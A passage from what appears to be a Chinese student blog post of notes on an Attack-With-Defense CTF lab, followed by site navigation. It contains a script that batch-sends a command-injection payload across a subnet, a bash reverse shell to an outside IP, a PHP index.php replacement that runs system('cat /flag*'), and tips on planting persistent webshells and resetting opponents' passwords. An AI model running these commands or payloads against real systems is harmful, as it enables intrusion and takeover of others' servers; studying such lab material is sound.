+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">110</span>,<span class="number">120</span>):</span><br><span class="line">    url= <span class="string">"http://172.20."</span>+str(i)+<span class="string">".102/index.php?c=User&amp;a=ping"</span></span><br><span class="line">    data=&#123;<span class="string">"host"</span>=<span class="string">"127.0.0.1|cat /flag*"</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>：</span><br><span class="line">    	req=requests.post(url,data)</span><br><span class="line">    	<span class="keyword">print</span> <span class="string">"172.20."</span>+str(i)+<span class="string">".101"</span>,req.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>这只是批量获取了flag，但是如果要批量提交flag，需要识别验证码</p>
+<p>可以借鉴：<a href="https://blog.csdn.net/wy_97/article/details/78198502" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78198502</a> </p>
+<p>如果要对本地服务器进行加固，可以找到这个文件，然后删除这个函数</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjQsS.png" alt="NBjQsS.png"></p>
+<p>本地要删除这个shell文件，<strong>攻击别人时可以用D盾扫出来，直接利用</strong></p>
+<p>通过一个漏洞植入不死马，如果能对他的服务器进行重启的话，最好让他连接不上</p>
+<p>回到服务器，使用who命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>
+<p>可以知道谁在连接你，包括知道ip地址，但也有who识别不了的连接方式，叫做隐藏连接，自己去查</p>
+<p>接下来看另外一个服务，使用ifconfig得知ip，172.20.117.103</p>
+<p>url中输入该ip，显示502</p>
+<p>因为自己能进入服务器，控制服务器，所以不用端口扫描，当然对付别人的服务就可以扫一扫，没准别的队伍修改了</p>
+<p><img src="C:\Users\DGZ\AppData\Roaming\Typora\typora-user-images\image-20200623143139722.png" alt="image-20200623143139722"></p>
+<p>利用<code>netstat -ntl</code>命令查看端口，中间的t代表tcp协议，可以看到开放了80、22、5000端口</p>
+<p>url输入<code>172.20.117.103:5000</code>， 有显示内容</p>
+<p><img src="C:\Users\DGZ\AppData\Roaming\Typora\typora-user-images\image-20200623143925433.png" alt="image-20200623143925433"></p>
+<p>所以80端口可能是有东西显示的，但是可能有些问题或者没有首页</p>
+<p>浏览一下本地</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">ls -a</span><br><span class="line">#没有看到有用的文件夹</span><br><span class="line">#接下来继续找一下这个5000放在哪</span><br><span class="line">cd /</span><br><span class="line">ls</span><br><span class="line">#这个网站是用python写的</span><br><span class="line">cat /etc/rc.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjuxf.png" alt="NBjuxf.png"></p>
+<p>rc.local：</p>
+<blockquote>
+<p>rc.local 是启动加载文件，在ubuntu下要把一个程序加入开机启动，一般可以通过修改rc.local来完成，但ubuntu下有两个rc.local文件。分别是/etc/rc.local和/etc/init.d/rc.local</p>
+<p>/etc/rc.local这个脚本里面基本没有内容，就是写个模板让你放开机自启动程序的，把程序写在exit 0行的前面就行了。</p>
+<p>所以要添加开机启动项，只需在/etc/rc.local文件中添加就行了。</p>
+</blockquote>
+<p>而我们没有权限进入/usr 和/root等目录，需要root权限，而同样需要搜索对应版本号自己提权（系统漏洞类型）</p>
+<p>GK商城是python写的，了解一些python的漏洞，后面需要反弹一个shell出来进行加固，不然无法修改代码，这个漏洞就一直存在，也就无法加固，会被别人一直打</p>
+<p>谷歌：python 反弹shell</p>
+<p>本地开启端口监听：</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjMM8.png" alt="NBjMM8.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjmGt.png" alt="NBjmGt.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.24.11.132/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjnRP.png" alt="NBjnRP.png"></p>
+<p>但是出现了错误，反弹不了</p>
+<p>我们在攻击别人时，这时可以通过这个接口尝试进行修改密码</p>
+<p>谷歌搜索：ubuntu非交互修改密码</p>
+<p>修改成功再用ssh连接上，控制别人的机器</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjGIs.png" alt="NBjGIs.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBjlqg.png" alt="NBjlqg.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBj3ZQ.png" alt="NBj3ZQ.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NBj8aj.png" alt="NBj8aj.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NDEUA0.png" alt="NDEUA0.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NDE3cQ.png" alt="NDE3cQ.png"></p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NDEYBn.png" alt="NDEYBn.png"></p>
+<p>最后一个服务：172.20.117.101</p>
+<p>是一个cms</p>
+<p>本地ssh连接上后，在/var/www/html/目录下找到ecshop文件夹，进入后有version.txt，cat一下显示3.6</p>
+<p>接下来百度ecshop 3.6漏洞</p>
+<p>肯定有一个可以读取flag的地方</p>
+<p>搜到有一个命令执行的漏洞</p>
+<p>另外存在172.20.117.101/phpmyadmin</p>
+<p>可以找到账号密码，登录后进行phpmyadmin的getshell  </p>
+<p>下面这个例子我觉得有点奇怪，凭我的理解记录一下：</p>
+<blockquote>
+<p>假如某一个队分数比较高了，为了获取名次，降低他的名次，你对ta的服务的首页文件（index.php）这样操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"&lt;?php system(\"cat /flag*\");?&gt;"</span> &gt; <span class="number">1.</span>php</span><br><span class="line">mv index.php index.bak</span><br><span class="line">mv <span class="number">1.</span>php index.php</span><br></pre></td></tr></table></figure>
+<p>这样别人打开网站进去后，就直接显示flag</p>
+<p>我觉得能在别人的服务做到这样添加文件、移动文件的话，那你有什么事不能做呢…自己应该就是那个名次比较高的队伍吧</p>
+</blockquote>
+<p>之后在本地/var/www/html/ecshop/data/config.php中可以找到登录phpmyadmin的账号和密码</p>
+<p>另外：</p>
+<p><img src="https://s1.ax1x.com/2020/06/25/NDEt7q.png" alt="NDEt7q.png"></p>
+<p>可以看到config.php是www-data用户，不是root，可能有奇怪的地方，可能是一句话木马</p>
+<p>如果找到一句话木马，可以<code>ls -l</code>看看对应的文件我们有什么权限，再尝试删除、修改、替换、移动文件修补这个洞。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://dgz-cyber.github.io">DGZ</a>
+            <p>原文链接：<a href="https://dgz-cyber.github.io/2020/06/25/AWD%E5%AD%A6%E4%B9%A0/">https://dgz-cyber.github.io/2020/06/25/AWD%E5%AD%A6%E4%B9%A0/</a>
+            <p>发表日期：<a href="https://dgz-cyber.github.io/2020/06/25/AWD%E5%AD%A6%E4%B9%A0/">June 25th 2020, 10:05:20 pm</a>
+            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/06/25/AWD%E5%AD%A6%E4%B9%A0/">June 25th 2020, 10:05:53 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/05/20/%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%8A%E5%B7%A5%E5%85%B7/" title= "一些网站及工具">
+                    <div class="prevTitle">一些网站及工具</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:congjian_lin@163.com" target="_blank" rel="noopener" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/DGZ-cyber" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 62
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2020/06/25/AWD%E5%AD%A6%E4%B9%A0/" >AWD学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href= "/2020/05/20/%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%8A%E5%B7%A5%E5%85%B7/" >一些网站及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2020/05/14/Upload-labs%20%EF%BC%88%E7%9C%8B%E7%BC%98%E5%88%86%E5%A1%AB%E5%9D%91%EF%BC%89/" >Upload-labs （看缘分填坑）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2020/05/09/%E7%9C%8B%E9%9B%AA%E4%B8%80%E9%81%93RSA/" >看雪一道RSA</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/2020/05/07/Vmware%E7%94%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E5%BC%BA%E5%88%B6%E5%85%B3%E9%97%AD%E5%90%8E%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/" >Vmware用任务管理器强制关闭后处理方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/06</span><a class="archive-post-title" href= "/2020/05/06/%E6%B5%81%E5%AF%86%E7%A0%81%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" >流密码简单学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/2020/05/04/%E6%A0%BC%E6%9E%84%E9%80%A0%E5%AD%A6%E4%B9%A0/" >格构造学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2020/05/03/NTRU%E6%A0%BC%E5%AF%86%E7%A0%81/" >NTRU格密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2020/05/03/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%9A%84RSA/" >基于多项式的RSA</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2020/04/29/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%9F%B9%E8%AE%AD%E8%AE%B0%E5%BD%95-Misc/" >深信服培训记录-Misc</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href= "/2020/04/28/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E9%95%BF%E5%BA%A6%E6%94%BB%E5%87%BB%E5%8F%8A%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E/" >哈希扩展长度攻击及哈希碰撞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href= "/2020/04/25/%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E8%B5%9B-Crypto/" >安恒四月赛-Crypto</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2020/04/24/NCTF2019%20ChildRSA%20wp/" >NCTF2019 ChildRSA wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2020/04/24/%E8%99%8E%E7%AC%A6%E6%9D%AF-MISC-%E5%A5%87%E6%80%AA%E7%9A%84%E7%BB%84%E7%BB%87/" >虎符杯-MISC-奇怪的组织</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2020/04/22/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%9F%B9%E8%AE%AD%E8%AE%B0%E5%BD%95-Web/" >深信服培训记录-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2020/04/21/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%9F%B9%E8%AE%AD%E8%AE%B0%E5%BD%95-Crypto/" >深信服培训记录-Crypto</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2020/04/19/%E8%99%8E%E7%AC%A6ctf2020%E8%AE%B0%E5%BD%95%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/" >虎符ctf2020记录（待补充）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2020/04/17/DVWA-upload/" >DVWA-upload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2020/04/13/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/" >sql注入入门记录（未完）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2020/04/11/Arachni%E5%92%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/" >Arachni和命令的简单记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2020/04/03/%E5%85%B3%E4%BA%8ERGB%E6%95%B0%E5%80%BC%E8%BD%AC%E5%9B%BE%E7%89%87%E8%84%9A%E6%9C%AC%E4%BB%A5%E5%8F%8A%E8%9A%81%E5%89%91%E5%A4%87%E6%B3%A8%E4%BB%A5%E5%8F%8AZ3%E5%AD%A6%E4%B9%A0%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/" >关于RGB数值转图片脚本以及蚁剑备注以及Z3学习简单记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2020/04/02/angstormctf%20WP%20(%E6%9C%AA%E5%AE%8C)/" >angstormctf WP (未完)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2020/04/01/%E8%B5%B5%E5%B8%88%E5%82%85b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E4%BB%A5%E5%8F%8A%E4%B8%80%E7%82%B9misc%20(%E6%9C%AA%E5%AE%8C)/" >赵师傅b站视频学习记录以及一点misc (未完)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2020/03/30/2019%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B%20WP-Crypto%20%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/" >2019高校运维挑战赛 WP-Crypto （未完）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2020/03/29/BJDCTF%20WP%20-%20WEB-1/" >BJDCTF WP - WEB-1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2020/03/24/BJDCTF%20WP%20-%20MISC%E3%80%81CRYPTO%E3%80%81RE/" >BJDCTF WP - MISC、CRYPTO、RE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2020/03/20/Aurora%E6%8B%9B%E6%96%B0%E8%B5%9B%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Emod/" >Aurora招新赛——关于mod</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span><a class="archive-post-title" href= "/2020/03/19/%E7%83%A4%E9%B8%A1%E7%BF%85%EF%BC%88%E6%A0%B9%EF%BC%89%E5%8F%8A%E7%83%A4%E8%9B%8B%E6%8C%9E%E6%B6%B2%E8%AE%B0%E5%BD%95/" >烤鸡翅（根）及烤蛋挞液记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2020/03/11/%E7%83%A4%E7%AE%B1%E8%9B%8B%E7%B3%95%E8%AE%B0%E5%BD%95/" >烤箱蛋糕记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2020/03/11/%E8%AE%BA%E6%96%87%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/" >论文的一点记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href= "/2020/03/08/%E3%80%8A%E6%99%B6%E4%BD%93%E7%94%9F%E9%95%BF%E7%9A%84%E7%89%A9%E7%90%86%E5%9F%BA%E7%A1%80%E3%80%8B%E7%AC%AC%E4%B8%80%E3%80%81%E4%BA%8C%E3%80%81%E4%B9%9D%E7%AB%A0%EF%BC%88%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%EF%BC%89/" >《晶体生长的物理基础》第一、二、九章（未完待续）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/hgame2020%20RSA%EF%BC%9F/" >hgame2020 RSA？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/%E3%80%8A%E9%94%82%E7%A6%BB%E5%AD%90%E7%94%B5%E6%B1%A0%E6%9D%90%E6%96%99%E8%A7%A3%E6%9E%90%E3%80%8B%E8%AE%B0%E5%BD%95%EF%BC%88%E5%8D%8A%E7%94%B5%E6%B1%A0%EF%BC%89/" >《锂离子电池材料解析》记录（半电池）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/%E3%80%8A%E9%94%82%E7%A6%BB%E5%AD%90%E7%94%B5%E6%B1%A0%E6%9D%90%E6%96%99%E8%A7%A3%E6%9E%90%E3%80%8B%E8%AE%B0%E5%BD%95%EF%BC%88%E7%AC%AC%E4%B8%89%E7%AB%A0%EF%BC%89/" >《锂离子电池材料解析》记录（第三章）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/%E7%94%B5%E9%A5%AD%E7%85%B2%E8%9B%8B%E7%B3%95%E8%AE%B0%E5%BD%95/" >电饭煲蛋糕记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2020/03/03/hgame2020%20not_One-time/" >hgame2020 not_One-time</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2020/03/03/RSA%E2%80%94%E2%80%94%E5%BD%93e%E4%B8%8E%CF%86(n)%E4%B8%8D%E4%BA%92%E7%B4%A0%E6%97%B6/" >RSA——当e与φ(n)不互素时</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href= "/2020/02/28/Socketserver%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E5%A1%AB%EF%BC%89/" >Socketserver学习（待填）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2020/02/27/%E3%80%8A%E9%94%82%E7%A6%BB%E5%AD%90%E7%94%B5%E6%B1%A0%E6%9D%90%E6%96%99%E8%A7%A3%E6%9E%90%E3%80%8B%E8%AE%B0%E5%BD%95%EF%BC%88%E7%AC%AC%E4%B8%80%E3%80%81%E4%BA%8C%E7%AB%A0%EF%BC%89/" >《锂离子电池材料解析》记录（第一、二章）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2020/02/27/HGAME-MISC(WEEK%20TWO)%20Writes%20up/" >HGAME-MISC(WEEK TWO) Writes up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2020/02/25/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%8F%8APadding%20Oracle%20Attack(POA)%E7%9A%84%E8%AE%B0%E5%BD%95/" >CBC翻转攻击及Padding Oracle Attack(POA)的记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
